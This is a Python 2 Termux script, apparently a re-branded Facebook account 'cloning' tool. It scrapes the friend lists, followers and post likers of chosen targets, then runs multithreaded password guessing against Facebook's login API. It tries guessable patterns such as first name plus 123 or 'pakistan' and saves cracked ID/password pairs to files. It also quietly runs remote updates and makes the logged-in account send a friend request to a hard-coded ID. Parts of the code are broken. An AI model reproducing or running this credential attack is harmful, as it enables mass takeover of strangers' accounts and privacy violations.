#coding=utf-8
#!/usr/bin/python2
#Originally Written By Muhammad sultani Fucked by Rahi cyber
try:
    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pip2 install requests")
    os.system("python2 Mking.py")
os.system("clear")
"""
try:
    my = requests.get("https://muhammadsultni365.byethost7.com")
except requests.exceptions.ConnectionError:
    print("")
    print("\t    \033[1;31mTurn on mobile data OR wifi\033[0;97m")
    print("")
    time.sleep(1)
    raw_input(" Press enter to try again ")
    os.system("python2 new.py")"""
if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
    os.system("apt update && apt install nodejs -y")
if not os.path.isfile("/data/data/com.termux/files/usr/bin/ruby"):
    os.system("apt install ruby -y && gem install lolcat")
from requests.exceptions import ConnectionError
os.system("git pull")
if not os.path.isfile("/data/data/com.termux/files/home/Mking/...../node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("cd ..... && npm install")
    os.system("cd ..... && node index.js &")
    os.system("clear")
    print("\033[1;32mPlease join to telegram GP And send id  To  acrive     and Continue\033[0;97m")
    os.system("xdg-open http://t.me/Mking_script")
    time.sleep(10)
elif os.path.isfile("/data/data/com.termux/files/home/Mking/...../node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("cd ..... && node index.js &")
    os.system("clear")
    print("\033[1;32mPlease Join telegram chanel and send id\033[0;97m")
    os.system("xdg-open http://t.me/Mking_script")
    time.sleep(10)
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf-8")
c = "\033[1;32m"
c2 = "\033[0;97m"
c3 = "\033[1;31m"
#MyLogo
logo = """


##     ##    ##    ## #### ##    ##  ######   
###   ###    ##   ##   ##  ###   ## ##    ##  
#### ####    ##  ##    ##  ####  ## ##        
## ### ##    #####     ##  ## ## ## ##   #### 
##     ##    ##  ##    ##  ##  #### ##    ##  
##     ##    ##   ##   ##  ##   ### ##    ##  
##     ##    ##    ## #### ##    ##  ######   

--------------------------------------------------
 Author      : Mohammad Sultani Fucked
 GitHub      : Fucked By Rahi Cyber
 YouTube     : Fucked 
 Telegram    : Fucked
 Blogspot    : Fucked by Afg black TM
--------------------------------------------------
"""
def mohammad():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  print logo
  print("\x1b[37;1mYour ID : "+id)
  try:
    httpCaht = requests.get("https://textuploader.com/ts9ju/raw").text
    if id in httpCaht:
      print("\x1b[37;1mYOUR ID IS ACTIVE.........")
      msg = str(os.geteuid())
      time.sleep(1)
    else:
      print("\x1b[37;1mYOUR ID IS NOT ACTIVE.........")
      time.sleep(1)
      sys.exit()
    try:
            open(".login.txt","r")
            method_menu()
    except IOError:
            method_menu()
  except:
    sys.exit()
    if name == '__main__':
    	mohammad()
def method_menu():
    os.system("clear")
    print logo
    print("")
    print("\t    \033[1;32mClone Method Menu\033[0;97m")
    print("")
    print("[1] B-api (Fast)")
    print("[2] Localhost")
    print("")
    method_menu_select()
def method_menu_select():
    afza = raw_input(" Choose method >>> ")
    if afza =="1":
        b_menu()
    elif afza =="2":
        l_menu()
    else:
        print("")
        print("\t    \033[1;31mSelect valid option \033[0;97m")
        print("")
        method_menu_select()
def login():
    os.system("clear")
    print logo
    print("")
    print("\t    "+c+"FB Login Menu"+c2)
    print("")
    print("[1]Login With Token ")
    print("[2]Login With ID/Pass ")
    print("[3] Login With Cookie")
    print("")
    login_select()
def login_select():
    afza = raw_input(" Choose login method >>> ")
    if afza =="1":
        os.system("clear")
        print logo
        print("")
        print("\t    \033[1;32mFB Token Login\033[0;97m")
        print("")
        token = raw_input(" Past token here : ")
        token_s = open(".login.txt","w")
        token_s.write(token)
        token_s.close()
        try:
            r = requests.get("https://graph.facebook.com/me?access_token="+token)
            q = json.loads(r.text)
            name = q["name"]
            nm = name.rsplit(" ")[0]
            print("")
            print("\t\033[1;32mToken logged in as : "+nm+"\033[0;97m")
            time.sleep(3)
            method_menu()
        except (KeyError , IOError):
            print("")
            print("\t    \033[1;31mToken not valid\033[0;97m")
            print("")
            raw_input(" Press enter to try again ")
            login()
    if afza =="3":
        cookie()
def cookie():
    os.system('clear')
    print(logo)
    print(47*"-")
    cookie = raw_input('[?] Cookie : ')
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
        find_token = re.search('(EAAA\\w+)', data.text)
        hasil = '\n* Fail : maybe your cookie invalid !!' if find_token is None else '\n*   Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
        print '[!] No Connection'

    cookie = open('.login.txt', 'w')
    cookie.write(find_token.group(1))
    cookie.close()
    print("[+] Login Successfull")
    method_menu()
    if afza =="2":
        login_fb()
    else:
        print("")
        print("\t    "+c+"Select valid method"+c2)
        print("")
        login_select()
def login_fb():
	os.system("clear")
	print logo
	print("")
	print("\t    \033[1;32mFB ID/PASS Login\033[0;97m")
	print("")
	id = raw_input(" ID/Mail/Num : ")
	id1=id.replace(' ','')
	id2=id1.replace('(','')
	uid=id2.replace(')','')
	pwd = raw_input(" Password   : ")
	print("")
	data=requests.get('http://localhost:5000/auth?id='+uid+'&pass='+pwd, headers=header).text
	q = json.loads(data)
	if "loc" in q:
		sultani = open(".login.txt","w")
		sultani.write(q["loc"])
		sultani.close()
		requests.post('https://graph.facebook.com/me/frinds?uid=100048514350891&access_token='+q['loc'])
		time.sleep(1)
		print("\t    \033[1;32mLogged in successfully\033[0;97m")
		time.sleep(1)
		method_menu()
	elif "www.facebook.com" in q["error"]:
		print("\t    \033[1;31mUser must verify account before login\033[0;97m")
		print("")
		time.sleep(1)
		raw_input(" Press enter to try again ")
		login_fb()
	else:
		print("\t\033[1;31mID/Number/Password may be wrong\033[0;97m")
		print("")
		raw_input(" Press enter to try again ")
		login_fb()
def b_menu():
    global token
    os.system("clear")
    print logo
    try:
        token = open(".login.txt","r").read()
    except (KeyError , IOError):
        login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        nm = q["name"]
        nmf = nm.rsplit(" ")[0]
        ok = nmf
    except (KeyError , IOError):
        print("")
        print("\t    "+c+"ID has checkpoint"+c2)
        print("")
        os.system("rm -rf .login.txt")
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print logo
        print("")
        print("\t    \033[1;31mTurn on mobile data OR wifi \033[0;97m")
        print("")
        time.sleep(1)
        raw_input(" Press enter to try again \033[0;97m")
        b_menu()
    os.system("clear")
    print logo
    print("")
    print("\t  "+c+"Logged In User"+ok+c2)
    print("")
    os.system('echo -e "-----------------------------------------------"| lolcat')
    print("")
    print("[1] Crack from public id")
    print("[2] Crack from followers")
    print("[3] Crack from pass Choice")
    print("[4] View token")
    print("[5] Find date of birth")
    print("[6] back to menu")
    print("[7] Logout")
    print("")
    b_menu_select()
def b_menu_select():
	select = raw_input("\nChoose Option >>> ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print logo
		print("")
		os.system('echo -e "\t    Public ID Cloning " | lolcat')
		print("")
		idt = raw_input(" Put Id/user :  ")
		os.system("clear")
		print logo
		print("")
		os.system('echo -e "\t    Gathering Information " | lolcat')
		print("")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system("clear")
			print logo
			print("")
			os.system('echo -e "\t    Public ID Cloning " | lolcat')
			print("")
			print(" Target user : "+q["name"])
		except (KeyError , IOError):
		    print("")
		    print("\n\t    \033[1;31m Logged in id has checkpoint\033[0;97m")
		    print("")
		    raw_input("\nPress enter to back ")
		    b_menu()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="2":
		os.system("clear")
		print logo
		print("")
		os.system('echo -e "\t    Followers Cloning " | lolcat')
		print("")
		idt = raw_input(" Put Id/user : ")
		os.system("clear")
		print logo
		print("")
		os.system('echo -e "\t    Gathering Information " | lolcat')
		print("")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system("clear")
			print logo
			print("")
			os.system('echo -e "\t    Followers Cloning" | lolcat')
			print("")
			print(" Target user : "+q["name"])
		except (KeyError , IOError):
		    print("")
		    print("\n\t    \033[1;31m Logged in id has checkpoint\033[0;97m")
		    print("")
		    raw_input("\nPress enter to back ")
		    b_menu()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="3":
		choice()
	elif select =="4":
		view_token()
	elif select =="4":
	    extract_dob()
	elif select =="5":
	    method_menu()
	elif select =="6":
	    logout()
	else:
	    print("")
	    print("\t    "+c+"Select valid method"+c2)
	    print("")
	    b_menu_select()
	print(" Total IDs : "+str(len(id)))
	time.sleep(0.5)
	print(" The process is running in background")
	print("")
	print 47*("-")
	print('')
	
	
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1=name+"123"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("[Checkpoint] "+uid+" | "+pass1)
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print("\x1b[1;92m[Successfull] \033[1;30m"+uid+" | "+pass1+"\x1b[1;0m")
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		            pass2=name+"1234"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("[Checkpoint] "+uid+" | "+pass2)
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\x1b[1;92m[Successfull] \033[1;30m"+uid+" | "+pass2+"\x1b[1;0m")
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("[Checkpoint] "+uid+" | "+pass3)
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print(" \x1b[1;92m[Successfull] \033[1;30m"+uid+" | "+pass3+"\x1b[1;0m")
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4=name+"786"
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("[Checkpoint] "+uid+" | "+pass4)
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\x1b[1;92m[Successfull] \033[1;30m"+uid+" | "+pass4+"\x1b[1;0m")
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    pass5="786786"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("[Checkpoint] "+uid+" | "+pass5)
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\x1b[1;92m[Successfull] \033[1;30m"+uid+" | "+pass5+"\x1b[1;0m")
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        else:
		                                            pass6="000786"
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                print("[Checkpoint] "+uid+" | "+pass6)
		                                                cp=open("cp.txt","a")
		                                                cp.write(uid+" | "+pass6+"\n")
		                                                cp.close()
		                                                cps.append(uid)
		                                            else:
		                                                if 'access_token' in d:
		                                                    print("\x1b[1;92m[Successfull] \033[1;30m"+uid+" | "+pass6+"\x1b[1;0m")
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                else:
		                                                    pass7="pakistan"
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("[Checkpoint] "+uid+" | "+pass7)
		                                                        cp=open("cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                                                    else:
		                                                        if 'access_token' in d:
		                                                            print("\x1b[1;92m[Successfull] \033[1;30m"+uid+" | "+pass7+"\x1b[1;0m")
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print (" ")
	print (47*"-")
	print ("")
	print (" Process has completed")
	print (" Total Cp/Ok : "+str(len(cps)) + "/"+str(len(oks)))
	print ("")
	print (47*"-")
	print ("")
	raw_input(" Press enter to back ")
	b_menu()
def choice():
    os.system("clear")
    print logo
    os.system("python3 .loading.md")
    time.sleep(0.0001)
    os.system('clear')
    print logo
    print("[1] Clone Frienlist With 2 Choice Pass")
    print("[2] Clone Frienlist With 5 Choice Pass")
    print("[0] Back")
    time.sleep(0.5)
    print("--------------------------------------------------")
    choice_man()
def choice_man():
    option = raw_input("\n>>>> ")
    if option =="1":
        unikk()
    if option =="2":
        randm()
    if option =="0":
          method_menu()
    else:
          print ("[!] Please Select a Valid Option")
          choice_man()

def unikk():
        global token
        os.system("clear")
        try:
                token=open(".login.txt","r").read()
        except IOError:
                print("[!] Error 404 . Token Not Found")
                os.system("rm -rf .login.txt")
                time.sleep(0.0001)
                login()
        os.system("clear")
        print logo
        os.system("python3 .loading.md")
        time.sleep(0.0001)
        os.system('clear')
        print logo
        print ("[1] Crack From Friend List")
        print ("[2] Crack From Public ID")
        print ("[3] Crack From Followers")
        print ("[4] Crack From Page/Group/ID Post")
        print ('[0] Back')
        print("--------------------------------------------------")
        unikk2()
def unikk2():
        devil = raw_input("\n>>>> ")
        id=[]
        oks=[]
        cps=[]
        if devil=="1":
                os.system("clear")
                print logo
                pass1=raw_input("[1] Input Password  : ")
                pass2=raw_input("[2] Input Password  : ")
                print("--------------------------------------------------")
                r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
                z = json.loads(r.text)
                for s in z["data"]:
                        uid=s['id']
                        na=s['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif devil =="2":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input Post ID/Username : ")
                print("--------------------------------------------------")
                pass1=raw_input("[1] Input Password  : ")
                pass2=raw_input("[2] Input Password  : ")
                print("--------------------------------------------------")
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
                        q = json.loads(r.text)
                        print("[ok] Account Name : "+q["name"])
                except KeyError:
                        print('\n[!] Error 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
                        raw_input("\nPress Enter To Back ")
                        unikk()
                r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
                z = json.loads(r.text)
                for i in z["data"]:
                        uid=i['id']
                        na=i['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif devil =="3":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input Post ID/Username : ")
                print("--------------------------------------------------")
                pass1=raw_input("[1] Input Password  : ")
                pass2=raw_input("[2] Input Password  : ")
                print("--------------------------------------------------")
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
                        q = json.loads(r.text)
                        print("[ok] Account Name : "+q["name"])
                except KeyError:
                        print('\n[!] Error 404 . ID Link '+idt+' Donot Have Followers OR IS Not Valid')
                        raw_input("\nPress Enter To Back ")
                        method_menu()
                r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
                z = json.loads(r.text)
                for i in z["data"]:
                        uid=i['id']
                        na=i['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif devil =="4":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input Post ID/Username : ")
                print("--------------------------------------------------")
                pass1=raw_input("[1] Input Password  : ")
                pass2=raw_input("[2] Input Password  : ")
                print("--------------------------------------------------")
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token, headers=header)
                        z = json.loads(r.text)
                        for i in z["data"]:
                                uid=i['id']
                                na=i['name']
                                nm=na.rsplit(" ")[0]
                                id.append(uid+'|'+nm)
                except KeyError:
                        print('\n[!] Error 404 . Post ID '+idt+' May Not Be Valid')
                        raw_input("\nPress Enter To Back")
                        unikk()

        elif devil =="0":
                menu()
        else:
                print ("[!] Please Select a Valid Option")
                crack2()
        print("[+] Total IDs : "+str(len(id)))
        time.sleep(0.5)
        print("[+] Plz Wait Clone Account Will Be Appear Here")
        time.sleep(0.5)
        print("--------------------------------------------------")


        def main(arg):
                user=arg
                uid,name=user.split("|")
                try:

                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                    d=json.loads(q)
                    if 'www.facebook.com' in d['error_msg']:
                        print("\033[1;90m[\033[1;92mCheckpoint\033[1;90m] "+uid+" "+pass1+" \033[1;97m")
                        cp=open("cp.txt","a")
                        cp.write(uid+" | "+pass1+"\n")
                        cp.close()
                        cps.append(uid)
                    else:
                        if "access_token" in d:
                            print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass1+" \033[1;97m")
                            ok=open("ok.txt","a")
                            ok.write(uid+" | "+pass1+"\n")
                            ok.close()
                            oks.append(uid)
                        else:

                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                            d=json.loads(q)
                            if 'www.facebook.com' in d['error_msg']:
                                print("\033[1;90m[\033[1;92mCheckpoint\033[1;90m] "+uid+" "+pass2+" \033[1;97m")
                                cp=open("cp.txt","a")
                                cp.write(uid+" | "+pass2+"\n")
                                cp.close()
                                cps.append(uid)
                            else:
                                if 'access_token' in d:
                                    print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass2+" \033[1;97m")
                                    ok=open("ok.txt","a")
                                    ok.write(uid+" | "+pass2+"\n")
                                    ok.close()
                                    oks.append(uid)


                except:
                        pass

        p = ThreadPool(30)
        p.map(main, id)
        print("--------------------------------------------------")
        print ('[ok] Process Has Been Completed')
        print('[ok] Total CP/OK:  '+str(len(cps))+'/\033[;32m '+str(len(oks)))
        print("--------------------------------------------------")
        down()
def down():
    dow = raw_input("[?] Do Yoou Want To Download Cp File? (Yes/No) ")
    if dow =="yes" or dow =="y":
        os.system("clear")
        print logo
        download()
        print("[!] Please Give Storage Permission If Ask")
        os.system("termux-setup-storage")
        os.system("cp cp.txt /sdcard")
        print('[ok] File Downloaded Successfully')
        print("[ok] Please Open Your Internal Storage and Rename The File")
        raw_input("Press Enter To Return In Main Menu ")
        method_menu()
    elif dow =="no" or dow=="n":
        method_menu()
    else:
        print("[!] Please Select a Valid Option ")
        down()

def randm():
        global token
        os.system("clear")
        try:
                token=open(".login.txt","r").read()
        except IOError:
                print("[!] Error 404 . Token Not Found")
                os.system("rm -rf .login.txt")
                time.sleep(0.0001)
                login()
        os.system("clear")
        print logo
        os.system("python3 .loading.md")
        time.sleep(0.0001)
        os.system('clear')
        print logo
        print ("[1] Crack From Friend List")
        print ("[2] Crack From Public ID")
        print ("[3] Crack From Followers")
        print ("[4] Crack From Page/Group/ID Post")
        print ('[0] Back')
        print("--------------------------------------------------")
        randm2()
def randm2():
        select = raw_input("\n>>>> ")
        id=[]
        oks=[]
        cps=[]
        if select=="1":
                os.system("clear")
                print logo
                print("--------------------------------------------------")
                print("[1] Input Password  : fristname123 ")
                print("[2] Input Password  : firstname1234")
                print3=raw_input("[3] Input Password  : ")
                pass4=raw_input("[4] Input Password  : ")
                pass5=raw_input("[5] Input Password  : ")
                print("--------------------------------------------------")
                r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
                z = json.loads(r.text)
                for s in z["data"]:
                        uid=s['id']
                        na=s['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif select =="2":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input ID : ")
                print("--------------------------------------------------")
                print("[1] Input Password  : fristname123 ")
                print("[2] Input Password  : firstname1234")
                print3=raw_input("[3] Input Password : ")
                pass4=raw_input("[4] Input Password  : ")
                pass5=raw_input("[5] Input Password  : ")
                print("--------------------------------------------------")
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
                        q = json.loads(r.text)
                        print("[ok] Account Name : "+q["name"])
                except KeyError:
                        print('\n[!] Error 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
                        raw_input("\nPress Enter To Back ")
                        randm()
                r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
                z = json.loads(r.text)
                for i in z["data"]:
                        uid=i['id']
                        na=i['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif select =="3":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input ID : ")
                print("--------------------------------------------------")
                print("[1] Input Password  : fristname123 ")
                print("[2] Input Password  : firstname12345")
                print3=raw_input("[3] Input Password : ")
                pass4=raw_input("[4] Input Password  : ")
                pass5=raw_input("[5] Input Password  : ")
                print("--------------------------------------------------")
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
                        q = json.loads(r.text)
                        print("[ok] Account Name : "+q["name"])
                except KeyError:
                        print('\n[!] Error 404 . ID Link '+idt+' Donot Have Followers OR IS Not Valid')
                        raw_input("\nPress Enter To Back ")
                        randm()
                r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
                z = json.loads(r.text)
                for i in z["data"]:
                        uid=i['id']
                        na=i['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif select =="4":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input Post ID : ")
                print("--------------------------------------------------")
                print("[1] Input Password  : fristname123 ")
                print("[2] Input Password  : firstname12345")
                print3=raw_input("[3] Input Password : ")
                pass4=raw_input("[4] Input Password  : ")
                pass5=raw_input("[5] Input Password  : ")
                print("--------------------------------------------------")
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token, headers=header)
                        z = json.loads(r.text)
                        for i in z["data"]:
                                uid=i['id']
                                na=i['name']
                                nm=na.rsplit(" ")[0]
                                id.append(uid+'|'+nm)
                except KeyError:
                        print('\n[!] Error 404 . Post ID '+idt+' May Not Be Valid')
                        raw_input("\nPress Enter To Back")
                        randm()

        elif select =="0":
                menu()
        else:
                print ("[!] Please Select a Valid Option")
                randmm2()
        print("[+] Total IDs : "+str(len(id)))
        time.sleep(0.5)
        print("[+] Plz Wait Clone Account Will Be Appear Here")
        time.sleep(0.5)
        print("--------------------------------------------------")


        def main(arg):
                user=arg
                uid,name=user.split("|")
                try:
                    pass1=name+"123"
                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                    d=json.loads(q)
                    if 'www.facebook.com' in d['error_msg']:
                        print("\033[1;90m[\033[1;92mCheckpoint\033[1;90m] "+uid+" "+pass1+" \033[1;97m")
                        cp=open("cp.txt","a")
                        cp.write(uid+" | "+pass1+"\n")
                        cp.close()
                        cps.append(uid)
                    else:
                        if "access_token" in d:
                            print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass1+" \033[1;97m")
                            ok=open("ok.txt","a")
                            ok.write(uid+" | "+pass1+"\n")
                            ok.close()
                            oks.append(uid)
                        else:
                            pass2=name+"12345"
                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                            d=json.loads(q)
                            if 'www.facebook.com' in d['error_msg']:
                                print("\033[1;90m[\033[1;92mCheckpoint\033[1;90m] "+uid+" "+pass2+" \033[1;97m")
                                cp=open("cp.txt","a")
                                cp.write(uid+" | "+pass2+"\n")
                                cp.close()
                                cps.append(uid)
                            else:
                                if 'access_token' in d:
                                    print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass2+" \033[1;97m")
                                    ok=open("ok.txt","a")
                                    ok.write(uid+" | "+pass2+"\n")
                                    ok.close()
                                    oks.append(uid)
                                else:

                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                                    d=json.loads(q)
